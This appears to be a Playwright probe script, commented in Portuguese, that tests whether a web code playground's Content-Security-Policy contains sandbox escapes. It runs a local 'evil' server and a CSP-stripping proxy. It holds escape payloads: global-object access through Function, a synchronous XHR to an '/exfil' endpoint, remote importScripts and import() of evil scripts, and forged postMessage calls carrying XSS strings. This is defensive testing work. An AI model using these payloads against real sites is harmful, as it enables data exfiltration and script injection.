// Probe 2: controle válido de CSP. Um proxy local (3102) repassa tudo para o next start (3101) e REMOVE
// o header Content-Security-Policy de todas as respostas (documento E script do worker).
// Compara o MESMO código do usuário com CSP (3101) e sem CSP (3102) contra o servidor malvado local (4999).
import http from 'node:http';
import { createRequire } from 'node:module';
import { writeFileSync } from 'node:fs';

const require = createRequire(import.meta.url);
const { chromium } = require('<repo>/node_modules/.pnpm/playwright-core@1.60.0/node_modules/playwright-core');

const WITH_CSP = 'http://127.0.0.1:3101';
const NO_CSP = 'http://127.0.0.1:3102';
const HEADLESS_SHELL = '<home>/.cache/ms-playwright/chromium_headless_shell-1243/chrome-headless-shell-linux64/chrome-headless-shell';
const OUT = process.argv[2];

const hits = [];
const evil = http.createServer((req, res) => {
  hits.push({ method: req.method, url: req.url, origin: req.headers.origin ?? null });
  const cors = { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Headers': '*' };
  if (req.url.startsWith('/evil.mjs')) { res.writeHead(200, { ...cors, 'Content-Type': 'application/javascript' }); res.end('globalThis.__evil_module_ran = true; export default 42;'); return; }
  if (req.url.startsWith('/evil.js')) { res.writeHead(200, { ...cors, 'Content-Type': 'application/javascript' }); res.end('self.__evil_script_ran = true;'); return; }
  res.writeHead(200, { ...cors, 'Content-Type': 'text/plain' }); res.end('EVIL-OK');
});
await new Promise((r) => evil.listen(4999, '127.0.0.1', r));

// proxy sem CSP
const proxy = http.createServer((creq, cres) => {
  const up = http.request({ host: '127.0.0.1', port: 3101, method: creq.method, path: creq.url, headers: { ...creq.headers, host: '127.0.0.1:3101' } }, (ures) => {
    const h = { ...ures.headers }; delete h['content-security-policy'];
    cres.writeHead(ures.statusCode, h); ures.pipe(cres);
  });
  up.on('error', () => { cres.writeHead(502); cres.end(); });
  creq.pipe(up);
});
await new Promise((r) => proxy.listen(3102, '127.0.0.1', r));

const browser = await chromium.launch({ executablePath: HEADLESS_SHELL });
const results = [];

async function runCase(name, base, code, { settleMs = 0, evilPrefix = '/' } = {}) {
  const before = hits.length;
  const context = await browser.newContext();
  const page = await context.newPage();
  const consoleMsgs = [];
  page.on('console', (m) => consoleMsgs.push(`${m.type()}: ${m.text()}`.slice(0, 420)));
  page.on('pageerror', (e) => consoleMsgs.push(`pageerror: ${String(e.message).slice(0, 300)}`));
  const entry = { name, base, evilHits: [], saida: '', console: [] };
  try {
    await page.goto(base + '/');
    await page.locator('.monaco-editor').first().waitFor({ state: 'visible', timeout: 20000 });
    await page.waitForFunction(() => window.monaco && window.monaco.editor.getModels()[0].getValue().includes('Eai sô'), null, { timeout: 20000 });
    await page.evaluate((c) => window.monaco.editor.getModels()[0].setValue(c), code);
    await page.getByRole('button', { name: /Bota pra moer/i }).click();
    await page.getByRole('status').filter({ hasText: /Rodou bonito|Deu ruim|travou/ }).waitFor({ timeout: 8000 });
    entry.saida = (await page.getByRole('tabpanel').innerText()).trim();
    if (settleMs) await page.waitForTimeout(settleMs);
  } catch (e) {
    entry.probeError = String(e.message).split('\n')[0].slice(0, 200);
    entry.bodyText = (await page.locator('body').innerText().catch(() => '')).slice(0, 300);
  }
  entry.evilHits = hits.slice(before).filter((h) => h.url.startsWith(evilPrefix)).map((h) => `${h.method} ${h.url} (Origin: ${h.origin})`);
  entry.console = consoleMsgs.filter((m) => !/React DevTools/.test(m));
  results.push(entry);
  console.log('\n=== ' + name + '  @' + base);
  console.log('  saida   :', entry.saida.replace(/\n/g, ' ⏎ ').slice(0, 500));
  if (entry.probeError) console.log('  PROBE   :', entry.probeError, '| body:', JSON.stringify(entry.bodyText));
  console.log('  evilHits:', JSON.stringify(entry.evilHits));
  if (entry.console.length) console.log('  console :', JSON.stringify(entry.console.map((c) => c.slice(0, 300))));
  await context.close();
}

const XHR = (tag) => `uai G é Function("return this")(); uai x é faz_um G.XMLHttpRequest(); tenta_aí { x.open("GET", "http://127.0.0.1:4999/exfil?${tag}", falso); x.send(); prosa("XHR status:", x.status, "corpo:", x.responseText); } se_der_ruim (e) { prosa("XHR falhou:", e.name, "-", e.message); }`;
const XHR_JS = (tag) => `const G = Function("return this")(); const x = new G.XMLHttpRequest(); try { x.open("GET", "http://127.0.0.1:4999/exfil?${tag}", false); x.send(); console.log("XHR status:", x.status, "corpo:", x.responseText); } catch (e) { console.log("XHR falhou:", e.name, "-", e.message); }`;
const IMPORT_SCRIPTS = (tag) => `const G = Function("return this")(); try { G.importScripts("http://127.0.0.1:4999/evil.js?${tag}"); console.log("importScripts executou; __evil_script_ran =", G.__evil_script_ran); } catch (e) { console.log("importScripts falhou:", e.name, "-", e.message); }`;
const DYN_IMPORT = (tag) => `import("http://127.0.0.1:4999/evil.mjs?${tag}").then(m => console.log("import ok", m.default)).catch(e => console.log("import erro:", e.message)); console.log("import() disparado");`;
const STRING_TIMER = `const G = Function("return this")(); const st = G["set" + "Timeout"]; const id = st("self.__viaTimerString = 1", 0); console.log("setTimeout(string) aceito, id =", typeof id);`;
const MAIN_THREAD = (tag) => `const G = Function("return this")(); console.log("worker, typeof document =", typeof G.document, "| typeof window =", typeof G.window, "| typeof localStorage =", typeof G.localStorage, "| typeof G.name =", typeof G.name, "| location =", G.location.href, "| origin =", G.location.origin);`;

// A) XHR síncrono
await runCase('A1 escape + XHR sync  [COM CSP]', WITH_CSP, XHR_JS('A1'), { evilPrefix: '/exfil' });
await runCase('A2 escape + XHR sync  [SEM CSP]', NO_CSP, XHR_JS('A2'), { evilPrefix: '/exfil' });
// B) importScripts cross-origin (worker clássico)
await runCase('B1 importScripts cross-origin [COM CSP]', WITH_CSP, IMPORT_SCRIPTS('B1'), { evilPrefix: '/evil.js' });
await runCase('B2 importScripts cross-origin [SEM CSP]', NO_CSP, IMPORT_SCRIPTS('B2'), { evilPrefix: '/evil.js' });
// C) import() dinâmico cross-origin
await runCase('C1 import() cross-origin [COM CSP]', WITH_CSP, DYN_IMPORT('C1'), { settleMs: 700, evilPrefix: '/evil.mjs' });
await runCase('C2 import() cross-origin [SEM CSP]', NO_CSP, DYN_IMPORT('C2'), { settleMs: 700, evilPrefix: '/evil.mjs' });
// D) timer com string (eval-like) e metadados do worker
await runCase('D1 setTimeout(string) [COM CSP]', WITH_CSP, STRING_TIMER);
await runCase('D2 contexto do worker', WITH_CSP, MAIN_THREAD('D2'));
// E) mensagem forjada para o main thread (postMessage nao esta sombreado; nao precisa de escape)
await runCase('E1 postMessage forjado {type:"ok", logs:5}', WITH_CSP, `postMessage({ type: "ok", logs: 5, js: "" });`);
await runCase('E2 postMessage forjado com HTML no log', WITH_CSP, `postMessage({ type: "ok", logs: [{ level: "log", parts: ["<img src=x onerror=alert(1)>", "<script>window.__xss=1</script>"] }], js: "<b>js</b>" });`);

writeFileSync(OUT, JSON.stringify(results, null, 2));
await browser.close(); evil.close(); proxy.close();
console.log('\nTOTAL de hits no servidor malvado:', hits.length);
